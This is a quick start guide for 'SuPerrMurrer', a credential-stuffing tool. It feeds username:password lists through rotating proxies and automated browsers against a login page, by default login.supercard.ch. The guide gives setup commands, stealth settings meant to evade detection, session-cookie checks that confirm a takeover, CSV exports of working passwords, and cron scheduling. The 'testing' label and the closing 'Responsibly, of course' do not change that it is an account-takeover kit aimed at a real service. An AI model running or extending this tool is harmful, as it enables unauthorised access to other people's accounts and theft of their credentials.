# Quick Start Guide

Get SuPerrMurrer up and running in 5 minutes.

## Prerequisites

- **Node.js** v14+ installed
- **Google Chrome** browser installed
- **10 MB** disk space
- **2 GB+** RAM

## Installation (2 minutes)

### Step 1: Clone Repository

```bash
git clone https://github.com/Lumbijumbi/SuPerrMurrer.git
cd SuPerrMurrer
```

### Step 2: Install Dependencies

```bash
npm install patchright proxy-chain
```

That's it! No build step required.

## Configuration (2 minutes)

### Step 3: Prepare Credentials File

Create `test.txt` with credentials to test (one per line):

```
username1:password1
username2:password2
user@example.com:secretpass
```

**Format:** `username:password` (colon-separated)

### Step 4: Prepare Proxies File

Create `Lightning_Proxies.txt` with proxy addresses (one per line):

```
http://proxy1.example.com:8080
http://username:pass@proxy2.example.com:8080
socks5://proxy3.example.com:1080
```

**Supported formats:**
- `http://host:port`
- `http://user:pass@host:port`
- `https://host:port`
- `socks5://host:port`

**Don't have proxies?** Use a proxy provider like:
- Bright Data
- Smartproxy
- Oxylabs
- Or any HTTP/SOCKS5 proxy service

## Running (1 minute)

### Step 5: Start Testing

```bash
node play_version2_controller.js
```

You should see:

```
[CONTROLLER] ════════════════════════════════════════════════════
[CONTROLLER] PATCHRIGHT CREDENTIAL TESTING CONTROLLER
[CONTROLLER] ════════════════════════════════════════════════════
[STARTUP] Configuration:
[STARTUP]   Total Credentials: 10
[STARTUP]   Total Proxies: 5
[STARTUP]   Credentials per Batch: 4
[STARTUP]   Max Parallel Workers: 4

[STARTUP] Created 3 batches
[STARTUP] Starting batch processing...

[Progress] [████████████░░░░░░░░░░░░] 50.0% 5/10
```

### What Happens Next?

1. **Controller** reads your files
2. **Workers** are spawned (4 parallel by default)
3. **Browsers** launch and test credentials
4. **Results** are logged in real-time
5. **Reports** are generated on completion

## Understanding Output

### Console Output

**Progress Bar:**
```
[Progress] [████████████████████░░░░] 80.0% 80/100
```

**Batch Results:**
```
[RESULTS] [Batch #5] Status: OK
[RESULTS]            Processed: 4
[RESULTS]            Success (>= 85%): 3/4
[RESULTS]            ✅ TGC Cookie: 2
[RESULTS]            ✅ Redirect 302: 1
[RESULTS]            Total: 20/100
[RESULTS]            Rate: 15.2 creds/min
```

**Final Report:**
```
════════════════════════════════════════════════════════════════
FINAL TESTING REPORT - REFINED DETECTION
════════════════════════════════════════════════════════════════

✅ SUCCESSFUL LOGINS (Confidence >= 85%): 75
   ├─ 🔑 TGC Cookie Success: 50 (66.7% of successes)
   ├─ 🔄 Redirect 302 Success: 20 (26.7% of successes)
   └─ 📝 Other Methods: 5

❌ FAILED LOGINS: 20
🚫 BLOCKED: 3
⚠️  CAPTCHA DETECTED: 2

════════════════════════════════════════════════════════════════
Total Processed: 100/100
Success Rate: 75.00% (only high-confidence >= 85%)
TGC Cookie Rate: 66.67% (of successful logins)
Processing Rate: 16.5 credentials/minute
Total Time: 363.2 seconds
════════════════════════════════════════════════════════════════
```

### File Output

After completion, check the `logs/` directory:

```
logs/
├── successful/
│   └── successes_2026-01-08.jsonl      # ✅ Successful logins
├── failed/
│   └── failures_2026-01-08.jsonl       # ❌ Failed attempts
├── blocked/
│   └── blocked_2026-01-08.jsonl        # 🚫 Blocked accounts
├── captcha/
│   └── captchas_2026-01-08.jsonl       # ⚠️  CAPTCHA encounters
├── screenshots/
│   ├── success_user1_timestamp.png     # 📸 Screenshots
│   └── failed_user2_timestamp.png
└── reports/
    ├── successful_2026-01-08.csv       # 📊 CSV reports
    ├── failed_2026-01-08.csv
    └── results_2026-01-08T12-00-00.json # 📊 JSON report
```

## Viewing Results

### CSV Reports (Excel/Spreadsheet)

Open in Excel, Google Sheets, or LibreOffice:

```bash
# Open successful logins
open logs/reports/successful_2026-01-08.csv

# Or with Excel
excel logs/reports/successful_2026-01-08.csv
```

**Columns:**
- Timestamp
- Username
- Password
- Method (detection method)
- Confidence (0.85-0.99)
- Duration (ms)
- Category

### JSON Reports (Programmatic)

```bash
# Pretty-print JSON
cat logs/reports/results_*.json | jq .

# Count successes
cat logs/reports/results_*.json | jq '.results.successful | length'

# Get success rate
cat logs/reports/results_*.json | jq '.stats.successful / .stats.totalProcessed * 100'
```

### JSONL Logs (Streaming)

```bash
# View successful logins
cat logs/successful/*.jsonl | jq .

# Filter by confidence
cat logs/successful/*.jsonl | jq 'select(.confidence >= 0.99)'

# Filter by method
cat logs/successful/*.jsonl | jq 'select(.method == "tgc_cookie")'

# Count by method
cat logs/successful/*.jsonl | jq -r '.method' | sort | uniq -c
```

## Common Adjustments

### Faster Processing

Want to process credentials faster?

```javascript
// Edit config.js

batch: {
  maxParallelWorkers: 8,      // More workers (default: 4)
  credentialsPerProxy: 8      // Bigger batches (default: 4)
},
form: {
  typeDelayMin: 2,            // Faster typing (default: 4)
  typeDelayMax: 5             // Faster typing (default: 10)
}
```

**⚠️ Warning:** Faster = higher detection risk

### Slower/Stealthier Processing

Want to avoid detection?

```javascript
// Edit config.js

batch: {
  maxParallelWorkers: 2,           // Fewer workers
  credentialsPerProxy: 2,          // Smaller batches
  pauseBetweenBatchMin: 10000,     // Longer pauses
  pauseBetweenBatchMax: 30000
},
form: {
  typeDelayMin: 10,                // Human-like typing
  typeDelayMax: 30
}
```

### Headless Mode (No Browser Windows)

Want to run without visible browsers?

```javascript
// Edit config.js

browser: {
  headless: true  // Change from false to true
}
```

**Benefits:**
- Lower memory usage
- Faster processing
- No screen clutter

## Stopping Execution

### Graceful Stop

Press **Ctrl+C** once:
- Workers finish current batch
- Results are saved
- Clean shutdown

### Force Stop

Press **Ctrl+C** twice:
- Immediate termination
- May lose current batch results

```bash
# Alternative: Kill by PID
ps aux | grep play_version2_controller
kill <PID>
```

## Troubleshooting

### No Proxies File

**Error:**
```
[STARTUP] No proxies found in Lightning_Proxies.txt
```

**Fix:**
```bash
echo "http://proxy.example.com:8080" > Lightning_Proxies.txt
```

### No Credentials File

**Error:**
```
[STARTUP] No valid credentials found in test.txt
```

**Fix:**
```bash
echo "user@example.com:password123" > test.txt
```

### Browser Launch Failed

**Error:**
```
Error: Failed to launch chrome!
```

**Fix:**
```bash
# Install Chrome
# Linux:
sudo apt-get install google-chrome-stable

# macOS:
brew install --cask google-chrome

# Windows: Download from google.com/chrome
```

### Out of Memory

**Error:**
```
<--- Last few GCs --->
JavaScript heap out of memory
```

**Fix:**
```bash
# Increase Node.js memory
export NODE_OPTIONS="--max-old-space-size=4096"
node play_version2_controller.js
```

Or reduce workers in `config.js`:
```javascript
batch: {
  maxParallelWorkers: 2  // Reduce from 4
}
```

## Next Steps

### Learn More

- **[Full Documentation](README.md)** - Complete guide
- **[Configuration](docs/CONFIGURATION.md)** - All settings explained
- **[Architecture](docs/ARCHITECTURE.md)** - How it works
- **[Detection](docs/DETECTION.md)** - Success detection methods
- **[API](docs/API.md)** - Code reference
- **[Troubleshooting](docs/TROUBLESHOOTING.md)** - Common issues

### Customize for Your Site

The default configuration targets `login.supercard.ch`. To test a different site:

1. Update `config.js`:
```javascript
login: {
  url: 'https://your-site.com/login',
  usernameSelector: '#email',      // Update selector
  passwordSelector: '#pass',       // Update selector
  submitSelectors: ['button[type="submit"]']
}
```

2. Test with one credential first

3. Adjust detection methods if needed

### Advanced Usage

**Run in background:**
```bash
nohup node play_version2_controller.js > output.log 2>&1 &
```

**Schedule with cron:**
```bash
# Edit crontab
crontab -e

# Run daily at 2 AM
0 2 * * * cd /path/to/SuPerrMurrer && node play_version2_controller.js
```

**Docker (future):**
```bash
docker build -t superrmurrer .
docker run -v $(pwd)/test.txt:/app/test.txt superrmurrer
```

## Performance Benchmarks

**Typical Performance:**
- **Speed:** 10-20 credentials/minute (depends on proxy speed)
- **Memory:** 500MB per worker (2-4GB total for 4 workers)
- **CPU:** ~25% per worker (100% total for 4 workers)

**Example Runs:**

| Credentials | Workers | Time | Rate |
|------------|---------|------|------|
| 100 | 4 | 6 min | 16.7/min |
| 500 | 4 | 30 min | 16.7/min |
| 1000 | 8 | 35 min | 28.6/min |

## Security Best Practices

1. **Secure credentials file:**
```bash
chmod 600 test.txt
```

2. **Secure logs directory:**
```bash
chmod 700 logs/
```

3. **Don't commit sensitive files:**
```bash
# Add to .gitignore
echo "test.txt" >> .gitignore
echo "Lightning_Proxies.txt" >> .gitignore
echo "logs/" >> .gitignore
```

4. **Clear logs regularly:**
```bash
# Archive and delete old logs
tar -czf logs-$(date +%Y%m%d).tar.gz logs/
rm -rf logs/*
```

## Getting Help

**Issues?** Check:
1. [Troubleshooting Guide](docs/TROUBLESHOOTING.md)
2. [GitHub Issues](https://github.com/Lumbijumbi/SuPerrMurrer/issues)
3. Configuration in `config.js`

**Questions?** Open an issue on GitHub.

---

**🎉 You're all set!** Happy testing! (Responsibly, of course.)
